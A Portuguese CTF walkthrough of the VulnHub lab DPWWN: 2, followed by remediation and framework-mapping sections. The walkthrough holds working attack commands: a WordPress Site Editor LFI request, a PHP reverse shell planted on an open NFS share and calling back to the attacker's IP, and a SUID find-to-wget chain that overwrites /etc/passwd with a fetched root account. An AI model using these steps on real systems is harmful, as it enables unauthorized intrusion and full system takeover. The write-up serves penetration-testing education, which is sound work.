# DPWWN: 2 — NFS Escancarado, LFI Batendo na Porta

DPWWN: 2 sobe a dificuldade em relação ao seu antecessor. Você combina duas misconfigurations distintas: um compartilhamento NFS exportado para todos e um plugin WordPress com vulnerabilidade conhecida de Local File Inclusion. Plante um shell PHP no mount NFS, dispare-o via LFI, e você tem um shell. Depois abuse um binário `find` SUID para dar o bit SUID ao `wget`, sobrescreva o `/etc/passwd`, e faça login como root. Cada passo é uma primitiva de ataque real. Esta máquina é um ótimo estudo de como vulnerabilidades aparentemente separadas se tornam devastadoras quando encadeadas. Caixa muito sólida! ᕕ( ᐛ )ᕗ

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | DPWWN: 2 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/dpwwn-2,343/ |
| **Técnicas** | Enumeração de serviços Nmap, auditoria de plugins WordPress, LFI (EDB-44340), abuso de compartilhamento NFS, shell reverso PHP via cadeia LFI+NFS, abuso de SUID find (GTFOBins), escalação de privilégios via SUID wget, sobrescrita de /etc/passwd |
| **CVEs** | CVE-2018-7422 (LFI no WordPress Site Editor 1.1.1 — EDB-44340), CWE-276 (Permissões Padrão Incorretas — exportação NFS para todos), CWE-269 (Gerenciamento Impróprio de Privilégios — SUID no find) |
| **Grupos APT** | APT41: encadeia LFI e misconfigurations NFS para acesso inicial em ambientes WordPress corporativos; FIN7: usa abuso de binários SUID como escalação de privilégios em pós-exploração em alvos Linux |

---

## Resumo do Ataque

```
nmap: HTTP (80/443), NFS (2049)
    |
    v
dirb → /wordpress/ descoberto
    |
    v
wpscan → plugin Site Editor 1.1.1 vulnerável a LFI (EDB-44340)
    |
    v
showmount -e → exportação NFS /home/dpwwn02 (todos)
    |
    v
Montar compartilhamento NFS → plantar shell.php em /home/dpwwn02/
    |
    v
Disparar LFI: ajax_path=/home/dpwwn02/shell.php → shell reverso (usuário sem privilégios)
    |
    v
find / -perm -u=s → /usr/bin/find tem SUID
    |
    v
find /home -exec chmod u+s /usr/bin/wget \;
    |
    v
Criar /etc/passwd com novo usuário UID root → servir via HTTP
    |
    v
SUID wget -O /etc/passwd → sobrescrever passwd
    |
    v
su raj (pass123) → uid=0(root) → /root/dpwwn-02-FLAG.txt
```

---

## Metodologia

1. Scan completo de portas: HTTP (80, 443) e NFS (2049)
2. Enumeração web: descobrir instalação WordPress
3. Auditoria de plugins com WPScan: identificar Site Editor 1.1.1 vulnerável (LFI)
4. Enumeração NFS: identificar exportação acessível para todos `/home/dpwwn02`
5. Plantar shell PHP reverso no mount NFS
6. Disparar LFI para executar o shell plantado
7. Descobrir binário `find` SUID via GTFOBins
8. Usar `find` SUID para adicionar bit SUID ao `wget`
9. Sobrescrever `/etc/passwd` com entrada criada via SUID `wget`
10. Trocar para o novo usuário com UID root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 10.10.10.0/24
# Alvo: 10.10.10.10

nmap -sV -sC -p- 10.10.10.10
```

Saída esperada:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd
443/tcp  open  ssl/http Apache httpd
2049/tcp open  nfs     NFS
```

NFS na porta 2049 é o achado mais interessante aqui. Um compartilhamento NFS exposto em um CTF quase sempre significa uma exportação acessível para todos. HTTP/HTTPS indica uma aplicação web.

**MITRE ATT&CK:** T1046 — Descoberta de Serviço de Rede

---

## Passo 2 — Enumeração Web e Descoberta do WordPress

Acessar `http://10.10.10.10/` — página padrão do Apache. Executar força bruta de diretórios:

```bash
dirb http://10.10.10.10/
# Encontrado: /wordpress/
```

Acessar `http://10.10.10.10/wordpress/` — site WordPress confirmado.

```bash
# Identificar versão e plugins do WordPress
wpscan --url http://10.10.10.10/wordpress -e p --plugins-detection aggressive
```

Saída do WPScan (achado principal):

```
[!] Plugin: site-editor
    | Versão: 1.1.1
    | Vulnerabilidades:
    |  - Local File Inclusion
    |    - EDB-ID: 44340
```

Site Editor 1.1.1 tem uma LFI conhecida via parâmetro `ajax_path` em `ajax_shortcode_pattern.php`. Isso é CVE-2018-7422.

**Nota real:** Vulnerabilidades de plugins WordPress respondem por mais de 95% dos problemas de segurança do WordPress. Plugins desatualizados com CVEs públicas documentadas são um vetor de acesso inicial consistente. O APT41 visou especificamente instalações WordPress em ataques ao setor de saúde, usando LFIs de plugins para foothold inicial.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Voltada ao Público, T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Enumeração do Compartilhamento NFS

```bash
showmount -e 10.10.10.10
```

Saída:

```
Export list for 10.10.10.10:
/home/dpwwn02  (everyone)
```

O compartilhamento NFS `/home/dpwwn02` está exportado para todos. Isso significa que qualquer sistema na rede pode montá-lo e ler/gravar arquivos. Combinado com a LFI, isso é letal: se plantarmos um arquivo PHP no mount NFS, e a LFI conseguir alcançar esse caminho, o servidor web vai executá-lo.

**Nota real:** Compartilhamentos NFS exportados para `*` (todos) sem `root_squash` ou autenticação são uma misconfiguration crítica. Em ambientes de produção, compartilhamentos NFS expostos foram usados para movimento lateral e exfiltração de dados. A combinação com uma LFI de aplicação web que consegue referenciar caminhos montados via NFS é um padrão de ataque documentado nos guias de teste da OWASP.

**MITRE ATT&CK:** T1135 — Descoberta de Compartilhamento de Rede

---

## Passo 4 — Confirmar Vulnerabilidade LFI

Validar a LFI lendo `/etc/passwd`:

```bash
curl "http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd"
```

O conteúdo de `/etc/passwd` é retornado na resposta. LFI confirmada. O servidor web está lendo arquivos arbitrários do sistema.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 5 — Plantio de Shell no NFS e Disparo da LFI

Montar o compartilhamento NFS:

```bash
mkdir /tmp/nfsmount
mount -t nfs 10.10.10.10:/home/dpwwn02 /tmp/nfsmount
ls /tmp/nfsmount
```

Copiar e configurar um shell reverso PHP:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/nfsmount/shell.php
# Editar /tmp/nfsmount/shell.php:
#   $ip = '10.10.10.128';   (IP do atacante)
#   $port = 1234;
```

Iniciar o listener:

```bash
nc -lvnp 1234
```

Disparar a LFI para executar o shell:

```bash
curl "http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/dpwwn02/shell.php"
```

Shell reverso chega como usuário sem privilégios. O caminho de sistema de arquivos do servidor web (`/home/dpwwn02`) está alinhado com o caminho de mount NFS, tornando o arquivo alcançável via LFI.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando e Script: Shell Unix, T1505.003 — Componente de Software de Servidor: Web Shell

---

## Passo 6 — Enumeração de Binários SUID

A partir do shell reverso, enumerar binários SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Achados principais:

```
/usr/bin/find
/bin/su
/usr/bin/passwd
...
```

`/usr/bin/find` tem o bit SUID definido. Segundo o GTFOBins, `find` SUID consegue executar comandos arbitrários como root.

**Nota real:** SUID no `find` é um dos caminhos de escalação GTFOBins mais documentados. Nunca deveria estar definido em sistemas de produção. Auditoria regular de SUID com `find / -perm -u=s -type f 2>/dev/null` é um item padrão de verificação de hardening nos benchmarks CIS.

**MITRE ATT&CK:** T1548.001 — Abuso de Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Passo 7 — Cadeia SUID: find → wget → Sobrescrita de /etc/passwd

Usar o `find` SUID para adicionar o bit SUID ao `wget`:

```bash
find /home -exec chmod u+s /usr/bin/wget \;
ls -la /usr/bin/wget
# -rwsr-xr-x ... /usr/bin/wget
```

Na máquina do atacante, criar um `/etc/passwd` malicioso:

```bash
# Obter uma cópia do /etc/passwd atual do alvo
# (via LFI ou via shell)
# Adicionar nova entrada de usuário com UID root

# Gerar hash de senha para "pass123":
openssl passwd -1 -salt user3 pass123
# Saída: $1$user3$rSp9rLQBVNlc32K4.eSMk.  (exemplo)

# Criar o arquivo passwd malicioso
cp /etc/passwd /tmp/passwd_malicioso
echo 'raj:$1$user3$rSp9rLQBVNlc32K4.eSMk.:0:0:raj:/root:/bin/bash' >> /tmp/passwd_malicioso

# Servir o arquivo
python3 -m http.server 8080
```

No alvo, usar `wget` SUID para sobrescrever `/etc/passwd`:

```bash
wget -O /etc/passwd http://10.10.10.128:8080/passwd_malicioso
```

Trocar para o novo usuário root:

```bash
su raj
# Senha: pass123

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/dpwwn-02-FLAG.txt
```

Root obtido!

**MITRE ATT&CK:** T1078 — Contas Válidas, T1548.001 — Abuso de Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado/Crackeado |
|---|---|---|---|
| Credencial injetada | `raj:pass123` (UID 0) | Criada e injetada via SUID wget | su raj → root |
| Flag root | Conteúdo de `/root/dpwwn-02-FLAG.txt` | Após sobrescrita de /etc/passwd | Flag final |

---

## Lições Aprendidas

| Nº | Achado | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Compartilhamento NFS exportado para todos | Compartilhamentos NFS acessíveis para todos permitem plantio de arquivos e movimento lateral; comum em ambientes corporativos com configurações NFS legadas | Restringir exportações NFS a IPs ou sub-redes específicos; habilitar `root_squash`; exigir autenticação Kerberos para NFS |
| 2 | LFI no WordPress Site Editor 1.1.1 (CVE-2018-7422) | Plugins WordPress desatualizados com CVEs públicas de LFI são um vetor de acesso inicial consistente | Manter inventário de plugins WordPress; corrigir ou remover plugins não utilizados; implementar regras WAF para padrões LFI |
| 3 | Encadeamento NFS+LFI permite execução de arquivos | Duas misconfigurations de baixa-média severidade se tornam críticas quando combinadas | Realizar análise de caminho de ataque, não apenas avaliação de vulnerabilidade individual; considerar como achados se encadeiam |
| 4 | SUID no /usr/bin/find | O GTFOBins documenta dezenas de caminhos de escalação SUID; find é um dos mais conhecidos | Auditar binários SUID regularmente; remover SUID de binários não essenciais; usar perfis AppArmor/SELinux |
| 5 | SUID no wget permite sobrescrita de /etc/passwd | Qualquer programa com SUID que pode gravar arquivos arbitrários pode ser usado para sobrescrever arquivos de sistema críticos | Nunca definir SUID no wget ou curl; usar flags imutáveis em /etc/passwd quando possível |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviço de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Compartilhamento de Rede | T1135 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada ao Público | T1190 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Execução | Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Persistência | Persistência | Componente de Software de Servidor: Web Shell | T1505.003 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Controle de Elevação: Setuid | T1548.001 |
| Evasão de Defesa | Evasão de Defesa | Contas Válidas | T1078 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Restringir exportações NFS:** modificar `/etc/exports` para permitir apenas hosts confiáveis específicos; adicionar opções `root_squash` e `no_exec`
2. **Atualizar ou remover Site Editor 1.1.1:** aplicar patches disponíveis ou remover o plugin completamente; auditar todos os plugins instalados com `wpscan --enumerate p`
3. **Implementar regras WAF para LFI:** bloquear requisições com traversal de caminho `../` e injeção de caminho absoluto no parâmetro `ajax_path`
4. **Remover SUID do find:** `chmod u-s /usr/bin/find`; auditar todos os binários SUID: `find / -perm -4000 2>/dev/null`
5. **Remover SUID do wget:** `chmod u-s /usr/bin/wget`; wget com SUID nunca é legítimo
6. **Proteger /etc/passwd com flag imutável:** `chattr +i /etc/passwd`; atacantes não conseguem sobrescrevê-lo mesmo com escrita de arquivo em nível root
7. **Desabilitar NFS em sistemas que não precisam:** `systemctl disable nfs-kernel-server; systemctl stop nfs-kernel-server`

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar exportações NFS e plugins WordPress |
| Proteger | Controle de Acesso | Restringir NFS a hosts específicos; remover SUID de binários não essenciais |
| Proteger | Segurança de Dados | Proteger /etc/passwd com flag imutável; restringir acesso de escrita NFS |
| Detectar | Anomalias e Eventos | Alertar sobre mounts NFS de hosts inesperados; monitorar padrões LFI em logs web |
| Responder | Planejamento de Resposta | Remover webshells plantados; revogar acesso NFS não autorizado; restaurar /etc/passwd de backup |
| Recuperar | Planejamento de Recuperação | Auditar todos os arquivos de sistema para modificações não autorizadas; rotacionar todas as credenciais de serviço |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restringir exportações NFS apenas a hosts autorizados |
| AC-6 | Privilégio Mínimo | Remover SUID do find e wget; aplicar permissões mínimas a compartilhamentos NFS |
| CM-7 | Funcionalidade Mínima | Desabilitar NFS se não necessário; remover plugins WordPress não utilizados |
| SI-10 | Validação de Entrada de Informação | Implementar regras WAF bloqueando padrões LFI em entradas de aplicação web |
| SI-2 | Remediação de Falhas | Corrigir CVE-2018-7422 (Site Editor 1.1.1) como vulnerabilidade de alta prioridade |

### CISA KEV

O CVE-2018-7422 (LFI no WordPress Site Editor 1.1.1) é uma vulnerabilidade publicamente documentada com código de exploit publicado no Exploit-DB (EDB-44340). A misconfiguration NFS que permite plantio de arquivos está alinhada com o CISA Advisory AA22-074A sobre exploração de misconfigurations de serviços de rede por atores de ameaça.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Software | MIL2 |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Identificar e Priorizar Vulnerabilidades | MIL2 |

### MITRE D3FEND

- **D3-ACH:** Hardening de Configuração de Aplicação (restrições de exportação NFS; remover binários SUID)
- **D3-IAVV:** Validação de Entrada (regras WAF para padrões LFI)
- **D3-NTF:** Filtragem de Tráfego de Rede (restringir porta NFS 2049 a sub-redes autorizadas)

---

## Considerações Finais

DPWWN: 2 ensina a lição mais importante em testes de penetração: vulnerabilidades não existem em isolamento. A misconfiguration NFS sozinha é de baixa a média severidade. A LFI do WordPress sozinha é de média severidade. Combinadas, permitem execução remota de código. É por isso que análise de caminho de ataque encadeado importa, e por isso scanners de vulnerabilidade que pontuam achados isoladamente perdem o risco real.

A cadeia SUID (find → chmod wget → sobrescrever /etc/passwd) é um ótimo exemplo de como o GTFOBins transforma um único binário mal configurado em um shell root. Qualquer auditoria SUID que revelar `find` ou `wget` deve ser tratada como um achado crítico imediato.

Encadeie tudo. Pense em caminhos de ataque. Essa é a lição do DPWWN: 2.

Thanks guys!! (❍ᴥ❍ʋ)
